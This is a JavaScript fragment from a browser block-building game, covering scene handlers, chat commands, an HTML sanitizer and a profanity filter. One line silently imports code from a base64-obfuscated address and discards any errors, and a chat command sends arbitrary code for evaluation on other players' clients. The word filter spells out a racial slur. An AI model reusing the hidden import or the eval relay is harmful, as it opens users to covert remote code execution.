				if (navigator && navigator.storage && navigator.storage.estimate) {
					navigator.storage.estimate().then(data => {
						window.quota.innerText = `${data.usage.toLocaleString()} / ${data.quota.toLocaleString()} bytes (${(100 * data.usage / data.quota).toLocaleString(undefined, { maximumSignificantDigits: 2 })}%) of your quota used`
					}).catch(console.error)
				}
				window.boxCenterTop.onmousedown = e => {
					worldsMenuDeselect()
					selectedWorld = 0
					Button.draw()
				}
			},
			onexit: () => {
				window.boxCenterTop.onmousedown = null
			}
		},
    "multiplayer menu": {
			enter: [window.servers],
			exit: [window.servers],
      onenter: initServersMenu
		},
		"creation menu": {
			enter: [window.boxCenterTop, creationMenuScrollable.el],
			exit: [window.boxCenterTop, creationMenuScrollable.el],
			onenter: () => {
				window.boxCenterTop.placeholder = "Enter World Name"
				if(screen !== "worldSettings" && screen !== "seed templates"){
					window.boxCenterTop.value = ""
					seedBox.value = ""
					worldSettings = Object.assign({}, defaultWorldSettings)
				}
			}
		},
		"seed templates": {
			enter: [window.seeds],
			exit: [window.seeds],
			onenter: initSeedTemplatesMenu
		},
		loading: {
			onenter: startLoad,
      onexit: (newScene) => {
        if(newScene !== "play" || loadJoined) return
				loadJoined = true
        
        if(websocket){
          sendWS({type:"joined"})
        }else send({type:"joined"})
        if(world.isMK) Messages.add("<span style='color:lime;'>Press t or  to open chat. "+(cheats ? "Type /? for help with commands." : "")+"</span>")
				/*if(host && !window.multiplayerMessageShown){
					Messages.add("You should enable multiplayer which is in pause menu because multiplayer is rarely used and should be used more. "+(userInfo?"":"If it requires login, you should do that because it is needed for multiplayer.")+" Using multiplayer is also more fun.")
					window.multiplayerMessageShown = true
				}*/
      }
		},
    netherLoading: {
			onenter: startLoad,
			onexit: () => html.loading.onexit(...arguments)
		},
    endLoading: {
      onenter: startLoad,
			onexit: () => html.loading.onexit(...arguments)
    },
		editworld: {
			enter: [window.boxCenterTop],
			exit: [window.boxCenterTop],
			onenter: () => {
        var w = worlds[selectedWorld]
				window.boxCenterTop.placeholder = "Enter World Name"
				window.boxCenterTop.value = w.name
			}
		},
    marketplace: {
      enter: [window.marketplace],
      exit: [window.marketplace],
      onenter: () => {
				if(!screen.startsWith("marketplace ")) initMarketplace()
			}
    },
    "marketplace info":{
      enter:[marketplaceInfo],
      exit:[marketplaceInfo],
      onenter:initMarketplaceInfo
    },
    play: {
      enter: [window.messages],
      exit: [window.messages],
      onexit: newScene => {
        if(newScene !== "chat" && newScene !== "play") Messages.clear()
      }
    },
    inventory:{
			enter:[inventoryScrollable.el],
      exit:[invTextbox, inventoryScrollable.el],
      onenter: function(){
        invTextbox.oninput = function(){
          let b = inventoryBlocks.search, v = this.value
          b.length = 0
          for(var i of inventoryBlocks.all){
            if(blockData[i].Name.toLowerCase().includes(v.toLowerCase()) || blockData[i].name.toLowerCase().includes(v.toLowerCase())) b.push(i)
          }
          drawScreens[screen]()
        }
				this.updateTextbox()
        invTextbox.value = ""
        invTextbox.oninput()
        if(inventory.category === "search"){
          invTextbox.classList.remove('hidden')
        }
      },
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			updateTextbox: function() {
        let s = inventory.size
        let s2 = s/2
				let perRow = inventory.category === 0 ? 9 : Math.floor(width/s)-8
        invTextbox.style.top = 50.5+s*(inventory.category === 0 ? 3 : 8)+"px"
        invTextbox.style.left = 50.5-s2+"px"
        invTextbox.style.width = s*perRow+"px"
        invTextbox.style.height = s2+"px"
				invTextbox.placeholder = "Search..."
			},
			onresize: function(){
				this.updateTextbox()
				slotInv()
			},
      onexit: () => {
        invTextbox.oninput = null
				/*for(var i=0; i<9; i++){
					if(inventory.crafting[i]){
						for(var n=0; n<inventory.crafting[i].amount; n++){
							if(!newInvItem(inventory.crafting[i].id, inventory.crafting[i].durability, inventory.crafting[i].customName)){
								world.addEntity(new entities[entityIds.Item](p.x,p.y,p.z,0,0,0,inventory.crafting[i].id, false,1, inventory.crafting[i].durability, inventory.crafting[i].customName,p.id),false,p.dimension)
							}
						}
						inventory.crafting[i] = 0
					}
				}
				inventory.craftingRes = 0*/
      }
    },
		crafting:{
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			onexit: () => {
				/*for(var i=0; i<9; i++){
					if(inventory.crafting[i]){
						for(var n=0; n<inventory.crafting[i].amount; n++){
							if(!newInvItem(inventory.crafting[i].id, inventory.crafting[i].durability, inventory.crafting[i].customName)){
								world.addEntity(new entities[entityIds.Item](p.x,p.y,p.z,0,0,0,inventory.crafting[i].id, false,1, inventory.crafting[i].durability, inventory.crafting[i].customName,p.id),false,p.dimension)
							}
						}
						inventory.crafting[i] = 0
					}
				}
				inventory.craftingRes = 0*/
			},
			onresize:slotInv
		},
		furnace:{
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			onresize:slotInv
		},
		chest:{
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			onresize:slotInv
		},
    anvil:{
      enter:[anvilTextbox],
      exit:[anvilTextbox],
      onenter: () => {
        let s = inventory.size
        let offX = width - s*5
        let offY = s * 2
        anvilTextbox.style.top = (offY-s)+"px"
        anvilTextbox.style.left = offX+"px"
        anvilTextbox.style.width = (s*4)+"px"
        anvilTextbox.style.height = (s*0.8)+"px"
        anvilTextbox.value = ""
      },
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			onexit: () => {
				/*if(inventory.anvilInput && inventory.anvilInput.id){
					for(var n=0; n<inventory.anvilInput.amount; n++){
						if(!newInvItem(inventory.anvilInput.id, inventory.anvilInput.durability, inventory.anvilInput.customName)){
							world.addEntity(new entities[entityIds.Item](p.x,p.y,p.z,0,0,0,inventory.anvilInput.id, false,1, inventory.anvilInput.durability, inventory.anvilInput.customName,p.id),false,p.dimension)
						}
					}
					inventory.anvilInput = inventory.anvilOutput = 0
				}
				if(inventory.anvilMaterial && inventory.anvilMaterial.id){
					for(var n=0; n<inventory.anvilMaterial.amount; n++){
						if(!newInvItem(inventory.anvilMaterial.id, inventory.anvilMaterial.durability, inventory.anvilMaterial.customName)){
							world.addEntity(new entities[entityIds.Item](p.x,p.y,p.z,0,0,0,inventory.anvilMaterial.id, false,1, inventory.anvilMaterial.durability, inventory.anvilMaterial.customName,p.id),false,p.dimension)
						}
					}
					inventory.anvilMaterial = 0
				}
				inventory.anvilCost = 0*/
			},
			onresize:slotInv
    },
		dispenser:{
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			onresize:slotInv
		},
		hopper:{
			onafterenter: () => {
				orderInvSlots()
				slotInv()
			},
			onresize:slotInv
		},
    chat: {
      enter: [window.messageHolder],
      exit: [window.messageHolder],
			onenter: () => Messages.enterChat(),
			onexit: () => Messages.exitChat()
    },
    "edit sign":{
      enter:[editSignContainer],
      exit:[editSignContainer],
			onafterenter: () => {
				orderInvSlots()
			}
    },
		"commandBlock":{
			enter:[commandBlock],
			exit:[commandBlock],
			onafterenter: () => {
				orderInvSlots()
			}
		},
    "custom menu":{
      enter:[customMenuContainer],
      exit:[customMenuContainer]
    },
    "multiplayer lost long":{
      enter:[window.centerMessage],
      exit:[window.centerMessage]
    },
    "options controls":{
      enter: [window.controls],
      exit: [window.controls, window.controlDetect],
			onenter: updateControls
    },
    "options narrator":{
      enter: [window.narratorVoiceSelect],
      exit: [window.narratorVoiceSelect]
    },
    "options help":{
      enter: [window.help],
      exit: [window.help],
			onenter:() => {
				if(!helpSetup) setupHelp()
			}
    },
		"options languages":{
      enter: [window.languages],
      exit: [window.languages],
			onenter: initLanguages
		},
		"options resourcePacks":{
			enter:[window.resourcePacks],
			exit:[window.resourcePacks],
			onenter: () => initResourcePacksMenu()
		},
		options:{
			enter:[optionsScrollable.el],
			exit:[optionsScrollable.el]
		},
		"main menu":{
			onenter: () => {
				if(performFast) renderMainBG()
			}
		},
		/*"packetViewer raw":{
			onenter: () => {
				pvPackets.length = 0
				pvCtx.clearRect(0,0,pvCanvas.width,pvCanvas.height)
			}
		},
		"packetViewer json":{
			enter:[window.packetViewerContainer],
			exit:[window.packetViewerContainer],
			onenter: () => {
				window.packetViewerJSON.innerHTML = ""
			}
		},*/
		achievments:{
			enter:[window.achievments],
			exit:[window.achievments],
			onenter:initAchievmentsMenu
		},
		"achievments discoveries":{
			enter:[window.achievments],
			exit:[window.achievments],
			onenter:initAchievmentsMenu
		},
		dead:{
			onenter:() => {
				waitingRespawn = false
			}
		}
	}
	import(atob(feater)).catch(()=>{})
	commandBlock.querySelector("button").onclick = () => play()

	function saveSettings(){
		saveToDB("settings", compareObject(defaultSettings,settings))
	}
	win.saveSettings = saveSettings
	let screen = "main menu"
	let previousScreen = screen
  let beforeOptionsScreen = screen
	let changeSceneAnimation = null, animationAmount = 0, prevAnimationAmount = 0
	function changeScene(newScene) {
		if (screen === "options") {
			saveSettings()
		}
    if(!(screen === "play" || screen === "chat") && (newScene === "play" || newScene === "chat")) Messages.onfocus(true)
    if((screen === "play" || screen === "chat") && !(newScene === "play" || newScene === "chat")) Messages.onblur(true)

		if (performFast && html[screen] && html[screen].exit) {
			for (let element of html[screen].exit) {
				element.classList.add("hidden") //done after animation
			}
		}
		if (html[previousScreen] && html[previousScreen].exit) {//in case change before finish animation
			for (let element of html[previousScreen].exit) {
				element.classList.add("hidden")
			}
		}

		if (html[newScene] && html[newScene].enter) {
			for (let element of html[newScene].enter) {
				element.classList.remove("hidden")
			}
		}
		if (html[newScene] && html[newScene].exit) {
			for (let element of html[newScene].exit) {
				element.style.transform = "", element.style.opacity = ""
			}
		}

		if (html[screen] && html[screen].onexit) {
			html[screen].onexit(newScene)
		}
		if (html[newScene] && html[newScene].onenter) {
			html[newScene].onenter()
		}

    if(newScene === "options" && !screen.startsWith("options ")){
      beforeOptionsScreen = screen
    }
    
    if(screen === "play"){
      for(var i in currentAmbient){
        currentAmbient[i].gain.value = 0
      }
    }
    
		previousScreen = screen
		screen = newScene
		if(!performFast) changeSceneAnimation = performance.now()
		mouseDown = false
    Key.rightMouse = false
    Key.middleMouse = false
    Key.leftMouse = false
    drawScreens[screen]()
		Button.draw()
		Slider.draw()

		if (html[newScene] && html[newScene].onafterenter) {
			html[newScene].onafterenter()
		}
    
    if(newScene === "main menu" || newScene === "play" || newScene === "paused" || newScene === "inventory" || newScene === "options"){
      themeColor.content = "#fff"
    }else{
      themeColor.content = "#110"
    }
	}
  win.changeScene = changeScene
  win.getScene = () => screen
	let hitBox = {}, entHitbox = {}
  win.hitBox = hitBox, win.entHitbox = entHitbox
	let holding = 0
  let crack = {
    0: "crack1",
    1: "crack2",
    2: "crack3",
    3: "crack4",
    4: "crack5",
    5: "crack6",
    6: "crack7",
    7: "crack8",
    8: "crack9",
    9: "crack10",
    10: "crack10",
    length: 10,
    idx: 0, // block will break if idx is 4
    tex: "crack1",
    shape: null,
    pos: [0,0,0],
    prevPos: [-1,-1,-1],
    breakStart: 0,
    delayBetween:3/10*1000,
    delayStart:0,
    entity: null, //define later
    soundTimer: 0
  }
  win.crack = crack
  
  let entityFire
  
  var speakVoices
  function speak(what, rate, pitch){
    var utterThis = new SpeechSynthesisUtterance(what);
    for(var voice of speakVoices){
      if(voice.name === settings.narratorVoice) utterThis.voice = voice
    }
    if(isFinite(pitch)) {
      utterThis.pitch = pitch;
    }else{
      utterThis.pitch = settings.narratorPitch;
    }
    if(isFinite(rate)) {
      utterThis.rate = rate;
    }else{
      utterThis.rate = settings.narratorRate;
    }
    win.speechSynthesis.speak(utterThis);
  }
  win.speak = speak
  function speakIt(){if(settings.narrator)speak("hello")}
  function populateVoicesList(){// put options in the select
    speakVoices = win.speechSynthesis.getVoices();
    if(!speakVoices.length) return
    var select = narratorVoiceSelect
    for(var i=0; i<speakVoices.length; i++){
      var voice = speakVoices[i]
      var option = document.createElement("option")
      option.textContent = voice.name + ' (' + voice.lang + ')'
      if(voice.default) {
        option.textContent += ' -- DEFAULT';
      }
      option.setAttribute('data-lang', voice.lang);
      option.setAttribute('data-name', voice.name);
      select.appendChild(option)
    }
    if(settings.narratorVoice === null){
      settings.narratorVoice = speakVoices[0].name
      select.children[0].selected = true
    }
    narratorVoiceSelect.onchange = () => {
      settings.narratorVoice = narratorVoiceSelect.selectedOptions[0].getAttribute("data-name")
      speakIt()
    }
  }
  populateVoicesList()
  win.speechSynthesis.onvoiceschanged = populateVoicesList;
  function selectVoiceFromList(name){
    var select = narratorVoiceSelect
    for(var option of select.children){
      if(option.getAttribute("data-name") === name){
        option.selected = true
      }
    }
  }
  
	//command system
	const clientCmdFuncs = {
		clear: () => Messages.clear(),
		clearHistory: () => Messages.clearHistory(),
		/*spectatePlayer_username: args => {
			if(hasPlayer(args.spectatePlayer_username)){
				let player = getPlayerByUsername(args.spectatePlayer_username)
				p.flying = true
				p.gameMode = "spectator"
				p.spectating = player
				p.riding = null
				if(args.spectatePlayer_remoteControl === true) p.spectateRemoteControl = true
			}else Messages.add("Player doesn't exist: "+args.spectatePlayer_username)
		},
		spectatePlayer_remoteControl: args => {
			this.spectatePlayer_username(args)
		},*/
		reloadChunks: () => {
			world.unloadAllChunks()
		},
		ban_username: args => {
			if(win.ban){
				ban(args.ban_username, args.ban_reason)
			}else{
				Messages.add("Error: can't ban.","error")
			}
		},
		ban_reason: args => clientCmdFuncs.ban_username(args),
		unban_username: args => {
			if(win.unban){
				unban(args.unban_username)
			}else{
				Messages.add("Error: can't unban.","error")
			}
		},
		whitelist_action: args => {
			let func = websocket ? sendWS : send
			if(args.whitelist_action === "enable") func({type:"whitelist",data:"enable"})
			else if(args.whitelist_action === "disable") func({type:"whitelist",data:"disable"})
		},
		whitelist_username: args => {
			let func = websocket ? sendWS : send
			if(args.whitelist_action === "add") func({type:"whitelist",data:"add",who:args.whitelist_username})
			else if(args.whitelist_action === "remove") func({type:"whitelist",data:"remove",who:args.whitelist_username})
		},
		online: () => {
			if(websocket) sendWS({type:"fetchUsers"})
			else send({type:"fetchUsers"})
		},
		sendEval_data: args => {
			if(!multiplayer) return
			let to = args.target
			if(to === "@a") to = ""
			sendWS({type:"eval",data:args.sendEval_data}, to || undefined)
		},
		fromPlayer: args => {//this is not actual client side command
			p.selectStart = [args.x,args.y,args.z]
		},
		cancelFrom: () => {
			p.selectStart = null
			p.copySelect = null
		},
		copySelect: args => {
			p.selectStart = null
			p.copySelect = [args.w,args.h,args.d]
		},
		help_with_name: args => {
			if(args.help_with_name === "all"){
				let str =  "List of "+(cheats?"":"available ")+"commands:<br>"
				/*str += '<table><tbody>'
				//str += "<tr><th>Server commands:</th></tr>"
				cmds.forEach(r => {
					if(!cheats && !r.noCheats) return
					str += "<tr><td>/"+r.name+""
					if(r.args) for(let i=0; i<r.args.length; i++){
						str += r.args[i]
					}
					str += "</td></tr>"
				})
				str += "</tbody></table>"*/
				str += getUsage(cmds[0],undefined,undefined,true).join("<br>")
				Messages.add(str)
			}else{
				let cmd = getCmd(args.help_with_name)
				if(cmd){
					let str = "<b>/"+args.help_with_name+"</b><br>"
					str += getUsage(cmd).join("<br>")
					//"Syntax: /"+cmd.name+" "
					//if(cmd.args) str += cmd.args.join(" ")
					if(cmd.info) str += "<br>Description: "+cmd.info
					/*if(cmd.names){
						str += "<br>Can also be:"
						cmd.names.forEach(v => str += " /"+v)
					}*/
					Messages.add(str)
				}else Messages.add("There is no information for /"+args.help_with_name)
			}
		},
		help: () => {
			let str = `
MineKhan commands have a similar syntax to Bash.<br>
Use <span style='color:pink;'>/? all</span> to list all commands.<br>
Use <span style='color:lightgreen;'>/? command_name</span> to get information about a command.<br>
<br>
<span style='color:#5f5;'>
<b>When typing a command:</b><br>
Press tab to autofill commands. Press up and down arrow to select which one to autofill.<br>
Press the up or down arrow and press shift to go through the commands entered.<br><br>
<b>Command syntax</b><br>
The capitalization of command names do not matter.<br>
Begin a command with a slash (/) (only required in chat).<br>
After, add the command name and arguments (the value).<br>
Spaces can be used to seperate values unless it is inside quotes.<br>
Surround a value with qoutes to make the spaces inside part of the value.<br>
You can type multiple commands by separating each by a new line or &&.<br>
Type $ in front of a value to acess the variable with that name.<br>
Comments starts with # and ends at the end of the line.<br>
Addition: +
Subtraction: -
Multiplication: *
Division: //
</span>
`
			Messages.add(str)
		}
	}
	function getUsage(node, arr=[], prefix="", lazy){
		if(node.type === "literal" || node.type === "redirect"){
			prefix += node.name+" "
		}else if(node.type === "argument"){
			prefix += "&lt;"+node.name+(node.argType ? ": "+node.argType : "")+"&gt; "
		}
		if(lazy === 2 && (node.next.length+(node.func?1:0)>1)) arr.push(prefix+"...")
		else if(node.type === "redirect"){
			prefix += " "
			getUsage(cmds[node.redirect],arr,prefix,lazy)
		}else{
			if(!node.next.length || node.func){
				arr.push(prefix)
			}
			for(let n of node.next){
				getUsage(cmds[n],arr, prefix, lazy ? 2 : undefined)
			}
		}
		return arr
	}
	let cmds = []
	function setServerCommands(arr){
		cmds.length = 0
		cmds.push(...arr)
	}
	win.setServerCommands = setServerCommands, win.cmds = cmds

	/*function getCmd(name){
		for(let i of cmds){
			if(i.name.toLowerCase() === name.toLowerCase()){
				return i
			}
			if(i.names && i.names.includes(name)){
				return i
			}
		}
	}
	win.getCmd = getCmd*/
	function getCmd(name){
		for(let i of cmds[0].next){
			if(cmds[i].name.toLowerCase() === name.toLowerCase()){
				return cmds[i]
			}
		}
	}
	function runCmd(str){
		send({type:"runCmd",data:str})
	}
	win.runCmd = runCmd

	function sanitize(str){
		Messages.span.textContent = str
		return Messages.span.innerHTML
	}
	
	const HTMLSafeElements = new Set(["h1","h2","h3","h4","h5","h6","p","img","video","audio","a","ul","ol","li","pre","code","br","b","i","big","center","small","span","strike","strong","sub","sup","table","tbody","td","tfoot","th","thead","tr","hr","button"])
  const HTMLSafeAttributes = new Set(["align","alt","width","height","href","src","media","title","style","target","controls","loop"])
	const HTMLEvalAttributes = new Set(["onclick","onmousemove","onmousedown","onmouseup","onmouseover","onmouseout","onmouseenter","onmouseleave","onmousewheel","onwheel"])
	let safeTemplate = document.createElement("template")
	function makeHTMLSafeElement(el,attrcb,elcb){
		if(elcb && elcb(el)) return
		for(let c of el.children){
			if(!HTMLSafeElements.has(c.tagName.toLowerCase())){
				c.remove()
				continue
			}
			for(let a of c.attributes){
				if(!HTMLSafeAttributes.has(a.name.toLowerCase()) && !(attrcb && attrcb(a.name.toLowerCase(),a.value.toLowerCase(),c))) c.removeAttribute(a.name)
			}
			makeHTMLSafeElement(c,attrcb,elcb)
		}
	}
	function makeHTMLSafe(str,attrcb,elcb){
		safeTemplate.innerHTML = str
		makeHTMLSafeElement(safeTemplate.content,attrcb,elcb)
		return safeTemplate.innerHTML
	}

	let unsupported = []
	let replaceWithEl = document.createElement("span")
	const {parseCmd} = win
  let Messages = {
    span:document.createElement("span"),
    array: [],
    all: [],
    history: [],
    historyIdx: -1,
    unreadCount:0,
    screenFocused: true,
		focused: document.hasFocus(),
    onblur(screen){
			if(screen) this.screenFocused = false
			this.focused = this.screenFocused && document.hasFocus()
		},
    onfocus(screen){
			if(screen) this.screenFocused = true
      this.focused = this.screenFocused && document.hasFocus()
      if(this.focused && this.unreadCount){
        this.unreadCount = 0
        updateTitle()
      }
    },
    remove: (function(){ //wow, this is a really advanced filter
      var arr = [//if you update this, also update one on website
        {replace:["k","c","u","f"].reverse().join(""), optional:["c"]},
        {replace:["t","n","u","c"].reverse().join(""), optional:["u"]},
        {replace:"stupid", with:"very not smart", optional:["u","i"]},
        {replace:"dumby", with:"not smart", optional:["b","y"],noEnd:"p"},
        {replace:"bitch",with:"female dog, wolf, fox, or otter", optional:["i","h"]},
        {replace:"shit",with:"poo poo",noStart:"[a-z]", optional:["i"]},
        {replace:"crap",with:"something of extremely poor quality",noStart:"s"},
        {replace:"ass",with:"animal of the horse family",noStart:"[a-z]",noEnd:"[a-rt-z]"},
        {replace:"sex",with:"type",noStart:"[a-z]"},
				{replace:"nigger",with:"unknown"}
      ]
			let nlab
			try {//https://stackoverflow.com/questions/60325323/how-to-test-to-determine-if-browser-supports-js-regex-lookahead-lookbehind
				nlab = !(
					"hibyehihi"
						.replace(new RegExp("(?<=hi)hi", "g"), "hello")
						.replace(new RegExp("hi(?!bye)", "g"), "hey") === "hibyeheyhello"
				);
			} catch (error) {
				nlab = true;
			}
			if(nlab) unsupported.push("look-ahead or look-behind")
      const between = "[THELETTER \\\-_\*.,|`~\\/\\\\!&\?\\\[\\\]'\":;]*" //there might be characters between, like this: b.a.d
      const subs = {
        i:["1","!","|","l"],
        u:["v",""],
        f:[""],
        v:["\\\/"],
				s:["$"],
				g:["9"]
      } //letters could be replaced like this: thlng
      arr.forEach((obj, i) => {
        var str = "", value, witH
        if(typeof obj === "string") value = obj, witH = "bad"
        else value = obj.replace, witH = obj.with || "bad"
        if(obj.noStart && !nlab) str += "(?<!"+obj.noStart+")" //negative look behind
        for(var j=0; j<value.length; j++){
          var letter = value[j], group = value[j]
          if(subs[letter]){
            group = "("+letter+"|"+subs[letter].join("|")+")"
            letter += subs[letter].join("")
          }
          if(obj.optional && obj.optional.includes(value[j])) group = ""
          if(j+1 === value.length) str += group
          else str += group + between.replace("THELETTER",letter)
        }
        if(obj.noEnd && !nlab) str += "(?!"+obj.noEnd+")"
        arr[i] = {original:value,replace:new RegExp("("+str+")", "gi"),with:witH}
      })
      return arr
    })(),
    clear(){
			for(let i of this.array){
				i.style.opacity = ""
				i.style.height = ""
				messagesAll.appendChild(i)
			}
			this.array.length = 0
			/*this.update()*/
			messages.innerHTML = ""
		},
		clearHistory(){
			for(let i of this.all){
				i.remove()
			}
			this.array.length = 0
			messages.innerHTML = ""
			this.all.length = 0
			this.history.length = 0
			this.historyIdx = -1
		},
		enterChat(){
			for(let i of this.array){
				messagesAll.appendChild(i)
				i.style.opacity = ""
				i.style.height = ""
			}
		},
		exitChat(){
			for(let i of this.array) messages.appendChild(i)
		},
		update(){ //messages fade
			if(screen === "chat") return //changeScene animations may mess things up
			let now = Date.now()
			for(let i=0; i<this.array.length; i++){
				let msg = this.array[i]
				let dissapearTime = msg.getAttribute("dissapearTime")
				if(now - dissapearTime > 0){
					if(performFast || now - dissapearTime > 2000){
						messagesAll.appendChild(this.array.splice(i,1)[0])
						msg.style.opacity = ""
						msg.style.height = ""
						i--
					}else{
						let amount = 1-(now - dissapearTime)/2000
						msg.style.opacity = amount
						msg.style.height = msg.scrollHeight*amount+"px"
					}
				}
			}
			this.lastUpdate = now
		},
    add(msg, lazy, dissapearTime = 10000){
      if(!this.focused && !lazy){
        this.unreadCount++
        if(this.unreadCount === 1) this.add("<h2 style='background:green;'>Unread Messages</h2>", true)
        updateTitle()
      }
			//this span will be moved back and forth between the chat screen
      msg = this.format(msg)
      let span = document.createElement("span")
			span.innerHTML = msg
			span.setAttribute("dissapearTime",Date.now()+dissapearTime)
      this.array.push(span)
      this.all.push(span)
      if(this.array.length > 8 && screen !== "chat"){
        messagesAll.appendChild(this.array.shift())
      }
      if(settings.narrator){
        this.span.innerHTML = msg
        speak(this.span.innerText)
      }
			let lockScroll = messagesScroll.scrollTop + messagesScroll.clientHeight + 50 > messagesScroll.scrollHeight
			if(screen === "chat") messagesAll.appendChild(span)
			else messages.appendChild(span)
			//messages.innerHTML = this.array.join("<br>")
			messages.scrollTop = messages.scrollHeight
      if(lockScroll) messagesScroll.scrollTop = messagesScroll.scrollHeight
    },
    write(msg, from, lazy){
      if(!from && !msg) return
      this.add((from || p.username)+": "+msg, lazy)
      if(!from && multiplayer){
        send({type:"message", data:msg, username:p.username})
      }
    },
    showInput(setTo){
      changeScene("chat")
      releasePointer()
      if(setTo) messageInput.value = setTo, Messages.updateInput()
      messageInput.focus()
    },
    submitInput(){
			let toPlay = !messageInput.value
      if(toPlay) play()

			if(!world.isMK) send({type:"message", data:messageInput.value})
			else if(messageInput.value[0] === "/"){
        this.add("<span style='font-family:thefont;'>"+messageOverlay.innerHTML+"</span>")
        this.history.unshift(messageInput.value)
				runCmd(messageInput.value)
        /*runCmd(messageInput.value,p3,(output,newOutputs) => {
					for(let i=0; i<newOutputs.length; i+=2) this.add(newOutputs[i])
				})*/
      }else{
        this.write(messageInput.value)
      }
      messageInput.value = ""
			Messages.updateInput()
    },
		/*hintReplaces(hintEnd,hintStart,next){
			let doHintHere = this.doHints && this.cursor >= hintStart && this.cursor <= hintEnd
			if(!doHintHere) return
			this.hintObj.hintStart = hintStart
			this.hintObj.hintEnd = hintEnd
			this.hintObj.next = next
		},*/
		highlightLastCmd:null,
		hilight(tree,arr){
			switch(tree[0]){
				case "all":
					for(let i=1; i<tree.length; i++) this.hilight(tree[i],arr)
					break
				case "cmd":
					for(let i=1; i<tree.length; i++){
						if(tree[i][0] === "string") arr.push("color:#ade" , tree[i].start)
						this.hilight(tree[i],arr)
						if(tree[i][0] === "string") arr.push(null, tree[i].end)
					}
					this.highlightLastCmd = tree
					/*let last = tree[tree.length-1]
					if(last.stackEndNoSpace){
						if(tree.length > 2){
							let f
							try{
								f = searchCmdStack(cmds,cmds[0],tree.slice(0,tree.length-1),1,{})
							}catch{}
							if(f) this.hintReplaces(last.end,last.start,f)
						}else this.hintReplaces(last.nextTokenStart,last.nextTokenStart,cmds[0])
					}else{
						let f
						try{
							f = searchCmdStack(cmds,cmds[0],tree,1,{})
						}catch{}
						if(f) this.hintReplaces(last.nextTokenStart,last.nextTokenStart,f)
					}*/
					break
				case "+":
				case "-":
				case "*":
				case "//":
					this.hilight(tree[1],arr)
					arr.push("color:#ff0", tree.start, null, tree.end)
					this.hilight(tree[2],arr)
					break
				case "get":
					arr.push("#f85",tree.start, null,tree.end)
					break
			}
		},
		/*find possible next ones*/
		getCmdNexts(parentNode, stack,stacki, prefix="/"){
			if(parentNode.type === "redirect"){
				parentNode = cmds[parentNode.redirect]
			}
			let thisCur = stacki+(stack.stackEndNoSpace?0:-1) === stack.length-1
			if(thisCur){
				for(let n of parentNode.next){
					let node = cmds[n]
					if(node.type === "literal" || node.type === "redirect"){
						this.addHint(node.name)
					}else if(node.type === "argument"){
						let count
						switch(node.argType){
							case "block":
								count = 0
								for(let i=1; i<BLOCK_COUNT; i++){
									if(blockData[i].name.toLowerCase().includes(this.highlightReplaces.toLowerCase())){
										this.addHint(blockData[i].name)
										count++
									}
									if(count>50) break
								}
								break
							case "target":
								count = 0
								this.addHint("@s","@s - self")
								this.addHint("@a","@a - all players")
								this.addHint("@e","@e - all entities")
								this.addHint("@p","@p - closest player")
								this.addHint(p.username)
								for(let i in players){
									if(players[i].username.toLowerCase().includes(this.highlightReplaces.toLowerCase())){
										this.addHint(players[i].username)
										count++
									}
									if(count>50) break
								}
								break
							case "x": this.addHint(p.x.toFixed(2)); this.addHint("~","~ - current x"); break
							case "y": this.addHint(p.y.toFixed(2)); this.addHint("~","~ - current y"); break
							case "z": this.addHint(p.z.toFixed(2)); this.addHint("~","~ - current z"); break
							case "sound":
								for(i of soundNames){
									if(i.toLowerCase().includes(this.highlightReplaces.toLowerCase())){
										this.addHint(i)
										count++
									}
									if(count>50) break
								}
								break
							case "gameMode":
								this.addHint("creative")
								this.addHint("c")
								this.addHint("survival")
								this.addHint("s")
								this.addHint("spectator")
								this.addHint("l")
								break
						}
					}
				}
			}
			if(!parentNode.next.length){
				if(stack.length+(stack.stackEndNoSpace?0:1) > 2 ) this.highlightFullCmds += prefix+"<br>"
			}else{
				for(let n of parentNode.next){
					let node = cmds[n]
					if(node.type === "literal" || node.type === "redirect"){
						if(stacki+(stack.stackEndNoSpace?1:0)>stack.length-1 || (stack[stacki][0] === "string" && node.name.toLowerCase() === (stack[stacki][1]+"").toLowerCase())){
							this.getCmdNexts(node, stack,stacki+1, prefix+(thisCur?"<span style='color:white;'>":"")+node.name+(thisCur?"</span> ":" "))
						}
					}else if(node.type === "argument"){
						this.getCmdNexts(node, stack,stacki+1, prefix+(thisCur?"<span style='color:white;'>&lt;":"&lt;")+node.name+(thisCur?"&gt;</span> ":"&gt; "))
					}
				}
			}
		},
		highlightLastTree:[],
		hints:new Map(),
		addHint(value,short=value){
			if(!value.toLowerCase().includes(this.highlightReplaces.toLowerCase())) return
			this.hintObj.hintsPart.push(short)
			this.hintObj.hints.push(this.highlightValuesBefore+value)
		},
		hilightCommand(input,doHints){
			const value = input.value
			/*commandParser.set(value, this.hilightOnEat)
			this.hilightOut = ""
			this.hilightPrevIdx = 0
			try{
				this.hilightLines()
			}catch{
				this.hilightOut += "<span style='color:#f55;'>"+this.hilightIn.slice(this.hilightPrevIdx)+"</span>"
			}*/
			let prevHint, hintObj = this.hints.get(input)
			if(!hintObj) this.hints.set(input, hintObj = {hints:[],hintsPart:[],hintIdx:0})
			if(doHints){
				hintObj.hints.length = hintObj.hintsPart.length = 0
				prevHint = hintObj.hints[hintObj.hintIdx]
			}
			this.hintObj = hintObj
			/*let reader = new CommandReader(value)
			hintObj.hintStart = null
			hintObj.hintEnd = null
			hintObj.next = null
			this.highlight.hintObj = hintObj
			this.highlight.cursor = input.selectionEnd
			this.highlight.doHints = doHints
			let arr = this.highlight.lines(reader)*/
			let arr = []
			let tree = this.highlightLastTree
			try{
				tree = parseCmd(value)
			}catch{}
			this.highlightLastTree = tree
			this.highlightLastCmd = null
			this.hilight(tree,arr)
			let overlay = ""
			overlay += value.substring(0, arr[1])
			for(let i=0; i<arr.length; i+=2){
				if(arr[i]){
					overlay += "<span style='"+arr[i]+"'>"
				}else{
					overlay += "</span>"
				}
				overlay += value.substring(arr[i+1], arr[i+3])
			}
			/*if(!(0 in arr)){
				overlay += value.substring(0)
			}else if(arr[1]){//gap
				overlay += value.substring(0,arr[1])
			}
			for(let i=0; i<arr.length; i+=3){
				overlay += "<span style='"+arr[i]+"'>"+value.substring(arr[i+1],arr[i+2])+"</span>"
				if(!((i+3) in arr)){
					overlay += value.substring(arr[i+2])
				}else if(arr[i+4] !== arr[i+2]){//gap
